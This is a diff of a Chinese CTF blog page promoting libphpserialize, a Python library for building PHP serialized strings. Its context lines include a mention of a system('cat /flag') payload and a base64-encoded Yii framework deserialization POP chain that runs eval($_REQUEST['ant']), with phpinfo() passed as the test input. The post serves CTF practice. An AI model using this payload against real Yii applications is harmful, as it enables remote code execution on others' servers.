@@ -14,8 +14,10 @@
 <meta property="og:description" content="就单纯想推销一下libphpserialize  如何用Python实现PHP的序列化  脑补 写代码  如何使用libphpserialize 安装 1pip3 install libphpserialize 使用 12from phpserialize import serializeprint(serialize(1)) 非常银杏方便 为什么不用php自己的serialize？  不用在你">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog.frankli.site/2021/06/15/Misc/libphpserialize/timeout.png">
+<meta property="og:image" content="https://blog.frankli.site/2021/06/15/Misc/libphpserialize/defeat.jpeg">
+<meta property="og:image" content="https://blog.frankli.site/2021/06/15/Misc/libphpserialize/yii.jpg">
 <meta property="article:published_time" content="2021-06-14T16:00:00.000Z">
-<meta property="article:modified_time" content="2021-06-15T06:41:02.000Z">
+<meta property="article:modified_time" content="2021-06-15T06:43:53.000Z">
 <meta property="article:author" content="Frank Li">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Toy">
@@ -206,7 +208,7 @@
 <img src="/2021/06/15/Misc/libphpserialize/timeout.png" class="">
 <p>再想象一下这样的场景：</p>
 <p>你已经成功地构造好了pop链，但是这个链非常长，而且需要精巧地构造属性值。你觉得用python构造这样的属性最简单，但是又不得不print出来然后粘贴到php代码里。你构造好了 <code>system('cat /flag');</code> 的payload，结果发现出题人在 <code>disable_functions</code> 中禁用了system函数。你不得不重新来一遍整个流程，构造属性，复制粘贴，生成序列化串，将序列化串粘回到python脚本里，请求。可是你突然发现你构造出来的序列化后的串突然用不了了，你找了10分钟，最后发现由于终端输出的字符数量限制，你只复制了一半。你非常气愤，直接在python脚本里 <code>payload = input()</code>，然后直接用管道符运行 <code>php generate.php | python3 exp.py</code>，结果发现仍然打不通。你又找了半天，发现php代码里用于调试的几个var_dump没有删。你一怒之下关闭了vscode，打开了LOL，找几个憨批进行一个人的祖安，还破坏了他人的游戏体验。</p>
-
+<img src="/2021/06/15/Misc/libphpserialize/defeat.jpeg" class="">
 <p>再想象一下：</p>
 <p>你的队友找到了一条pop链，但是二话不说给你发过来这样一串谜语</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;site%2Fabout&amp;message&#x3D;TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MzI6InlpaVxjYWNoaW5nXEV4cHJlc3Npb25EZXBlbmRlbmN5IjoxOntzOjEwOiJleHByZXNzaW9uIjtzOjIzOiJldmFsKCRfUkVRVUVTVFsiYW50Il0pOyI7fWk6MTtzOjE4OiJldmFsdWF0ZURlcGVuZGVuY3kiO319fQo&#x3D;&amp;ant&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
@@ -228,7 +230,8 @@
         CTFHUB framework
     </div>
     <div class='spoiler-content'>
-        No content to show
+        <img src="/2021/06/15/Misc/libphpserialize/yii.jpg" class="">
+
     </div>
 </div>
 <p>这道题是一道比较常规的框架反序列化，payload需要base64_encode后发送</p>
